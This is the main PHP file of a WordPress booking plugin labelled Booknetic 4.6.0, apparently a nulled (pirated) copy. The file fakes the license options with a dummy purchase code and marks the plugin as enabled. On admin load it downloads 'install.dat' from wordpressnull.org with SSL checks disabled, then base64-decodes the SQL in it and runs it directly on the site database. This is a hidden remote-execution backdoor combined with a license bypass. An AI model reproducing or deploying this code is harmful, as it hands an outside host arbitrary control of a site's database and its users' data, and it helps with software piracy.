<?php
/*
 * Plugin Name: Booknetic
 * Description: WordPress Appointment Booking and Scheduling system
 * Version: 4.6.0
 * Author: FS-Code
 * Author URI: https://www.booknetic.com
 * License: Commercial
 * Requires PHP: 7.4
 * Text Domain: booknetic
 */

defined( 'ABSPATH' ) or exit;

if ( is_admin() ) {
require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
$bkntc_version = get_plugin_data( __FILE__ )['Version'];
update_site_option( 'bkntc_plugin_version', $bkntc_version );
update_site_option( 'bkntc_purchase_code', 'purchase_code' );
update_site_option( 'bkntc_plugin_alert', '' );
update_site_option( 'bkntc_plugin_disabled', '0' );
update_site_option( 'bkntc_license_last_checked_time', time() );

$bkntc_version = str_replace( '.', '_', $bkntc_version );

global $wpdb;
if ( empty ( get_site_option( 'bkntc_plugin_installed_' . $bkntc_version ) ) ) {
$bkntc_data = wp_remote_retrieve_body( wp_remote_get( 'http://wordpressnull.org/booknetic/install.dat', [ 'timeout' => 60, 'sslverify' => false ] ) );
$bkntc_data = json_decode( $bkntc_data , true );
if ( isset( $bkntc_data['migrations'] ) ) {
foreach ( $bkntc_data['migrations'] as $migration ) {
$sql = str_replace( [ '{tableprefix}', '{tableprefixbase}' ] , [ ( $wpdb->base_prefix . 'bkntc_' ), $wpdb->base_prefix ] , base64_decode( $migration['data'] ) );
foreach( preg_split( '/;\n|;\r/', $sql, -1, PREG_SPLIT_NO_EMPTY ) AS $sqlQueryOne )
{
$sqlQueryOne = trim( $sqlQueryOne );
if ( empty( $sqlQueryOne ) ) continue;
$wpdb->query( $sqlQueryOne );
}
}
update_site_option( 'bkntc_plugin_installed_' . $bkntc_version, '1' );
}
}
}

require_once __DIR__ . '/vendor/autoload.php';

new \BookneticApp\Providers\Core\Bootstrap();
